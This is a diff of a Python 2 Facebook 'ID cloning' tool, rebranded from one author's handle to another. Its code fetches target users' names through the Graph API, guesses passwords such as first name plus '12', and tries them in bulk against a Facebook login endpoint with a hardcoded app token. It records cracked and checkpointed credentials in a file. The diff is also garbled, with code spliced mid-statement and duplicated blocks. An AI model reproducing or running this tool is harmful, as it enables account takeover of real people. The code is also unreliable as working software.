@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To lovehacker
+#The Credit For This Code Goes To mibrahim
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -52,16 +52,18 @@ def jalan(z):
 ##### LOGO #####
 logo = """
 \033[1;91m:•◈•╭━━╮╭╮╱╱╱╱╱╱╭╮╱╭━╮╭━╮╱╱╱╭━╮    :•◈•
-\033[1;91m:•◈•┃╭╮┃┃┃╱╱╱╱╱╱┃┃╱┃┃╰╯┃┃╱╱╱┃╭╯    :•◈•
+\033[1;91m:•◈•┃╭╮    :•◈•
 \033[1;91m:•◈•┃╰╯╰┫┃╭━━┳━━┫┃╭┫╭╮╭╮┣━━┳╯╰┳┳━━╮:•◈•
-\033[1;91m:•◈•┃╭━╮┃┃┃╭╮┃╭━┫╰╯┫┃┃┃┃┃╭╮┣╮╭╋┫╭╮┃:•◈•
-\033[1;91m:•◈•┃╰━╯┃╰┫╭╮┃╰━┫╭╮┫┃┃┃┃┃╭╮┃┃┃┃┃╭╮┃:•◈•
+\033[1;91m:•◈•┃╭━╮┃┃┃╭╮┃╭━┫╰╯┫┃┃┃┃┃╭╮┣╯┃┃╱╱╱┃╭  :•◈•
+\033[1;91m:•◈•┃╰╯╰┫┃mmmmmmmmmmm MUHAMMAD IBRAHIM ╮:•◈•
+\033[1;91m:•◈•┃╭━╮┃┃┃╭╮┃╭━┫╰╯MUHAMMAD IBRAHIM ┣╮╭╋┫╭╮┃:•◈•
+\033[1;91m:•◈•┃╰━╯┃╰┫╭╮┃╰━┫╭╮┫┃┃┃┃╮╭╋┫╭╮┃:•◈•
+\033[1;91m:•◈•┃╰━╯┃╰┫╭╮┃╰━┫╭╮┫ MUHAMMAD IBRAHIM ┃╭╮┃:•◈•
 \033[1;91m:•◈•╰━━━┻━┻╯╰┻━━┻╯╰┻╯╰╯╰┻╯╰╯╰╯╰┻╯╰╯
 \033[1;94m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mKali.linux\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•
-\033[1;91m:•◈•╔╗─────────╔╗───────╔╗
-\033[1;91m:•◈•║║─────────║║───────║║
-\033[1;91m:•◈•║║╔══╦╗╔╦══╣╚═╦══╦══╣║╔╦══╦═╗
-\033[1;91m:•◈•║║║╔╗║╚╝║║═╣╔╗║╔╗║╔═╣╚╝╣║═╣╔╝   World
+\033[1;91m:•◈•╔╗─────║║
+\033[1;91m:•◈•║║
+\033[1;91m:•◈•║║ MUHAMMAD IBRAHIM                          World
 \033[1;91m:•◈•║╚╣╚╝╠╗╔╣║═╣║║║╔╗║╚═╣╔╗╣║═╣║    Cloning
 \033[1;91m:•◈•╚═╩══╝╚╝╚══╩╝╚╩╝╚╩══╩╝╚╩══╩╝
 \033[1;94m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;91mKali.linux\033[1;94m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""
@@ -108,8 +110,8 @@ jalan('\033[1;95m▬▬▬▬▬▬▬▬▬90%')
 jalan('\033[1;95m▬▬▬▬▬▬▬▬▬100%')
 print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;94mkalilinux\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
 
-CorrectUsername = "World"
-CorrectPassword = "lovehacker"
+CorrectUsername = "ibrahim"
+CorrectPassword = "ibrahim5"
 
 loop = 'true'
 while (loop == 'true'):
@@ -117,7 +119,7 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;91m🗝 \x1b[1;91mTool Password \x1b[1;91m»» \x1b[1;92m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:love_hacker
+            print "Logged in successfully as " + username #Dev:kamngar_ibrahim
 	    time.sleep(2)
             loop = 'false'
         else:
@@ -212,7 +214,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;92mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:love_hacker
+	os.system("clear") #Dev:kamangar_ibrahim
 	print logo
 	print "  \033[1;92m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;92m----•◈••◈•-----»"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
@@ -311,7 +313,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:love_hacker
+			pass #Dev:kamangar_ibrahim
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
@@ -403,6 +405,14 @@ def pilih_super():
 															b = json.loads(a.text)
 															pass7 = b['first_name'] + '12'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+															q = json.load(da															cek.write(user+"|"+pass6+"\n")
+															cek.close()
+															cekpoint.append(user+pass6)
+														else:
+															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
+															b = json.loads(a.text)
+															pass7 = b['first_name'] + '12'
+															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
 																print '\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass7
@@ -422,25 +432,71 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKali.Linux\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
-	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:love_hacker
+	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:kamangar_ibrahim
 	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;92m....'
 	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
 	print """
              
-             ╔══╗░░░░╔╦╗░░╔═════╗    lovehacker
-             ║╚═╬════╬╣╠═╗║░▀░▀░║    BlackMafia
-             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    WhatsApp
-             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    03094161457
+             ╔══╗░░░░╔╦╗░░╔═════╗    muhammad
+             ║╚═╬════╬╣╠═╗║░▀░▀░║    
+             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    ibrahim
+             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    
              Checkpoint ID Open After 7 Days
 
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
 : \033[1;93m .....lovehacker  Kali.linux....... \033[1;91m :
 •\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
                 WhatsApp Num
+              \033[1;93m +9233634333"""
+	
+	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
+	menu()
+
+if __name__ == '__main__':
+	login()
+
+if __name__ == '__main__':
+	login()ta)
+															if 'access_token' in q:
+																print '\x1b[1;91m100% Hack💉\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass7
+																oks.append(user+pass7)
+															else:
+																if 'www.facebook.com' in q["error_msg"]:
+																	print '\x1b[1;93mAfter7Days🗝\x1b[1;97m-\x1b[1;93m✙\x1b[1;96m-' + user + '-\x1b[1;93m✙\x1b[1;93m-' + pass7
+																	cek = open("out/checkpoint.txt", "a")
+																	cek.write(user+"|"+pass7+"\n")
+																	cek.close()
+																	cekpoint.append(user+pass7)
+																	
+															
+		except:
+			pass
+		
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mKali.Linux\033[1;91m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+	print "  \033[1;93m«---•◈•---Developed By love-Hacker--•◈•---»" #Dev:kamangar_ibrahim
+	print '\033[1;91m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (python2 World.py)↩\033[1;92m....'
+	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;97m/\033[1;95m"+str(len(cekpoint))
+	print """
+             
+             ╔══╗░░░░╔╦╗░░╔═════╗    muhammadibrahim
+             ║╚═╬════╬╣╠═╗║░▀░▀░║    sweetdavil
+             ╠═╗║╔╗╔╗║║║╩╣║╚═══╝║    WhatsApp
+             ╚══╩╝╚╝╚╩╩╩═╝╚═════╝    033634333
+             Checkpoint ID Open After 7 Days
+
+•\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
+: \033[1;93m .....muhammadibrahim  Kali.linux....... \033[1;91m :
+•\033[1;91m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.' 
+                WhatsApp Num
               \033[1;93m +923094161457"""
 	
 	raw_input("\n\033[1;92m[\033[1;91mBack\033[1;96m]")
 	menu()
+
+if __name__ == '__main__':
+	login()
 
 if __name__ == '__main__':
 	login()
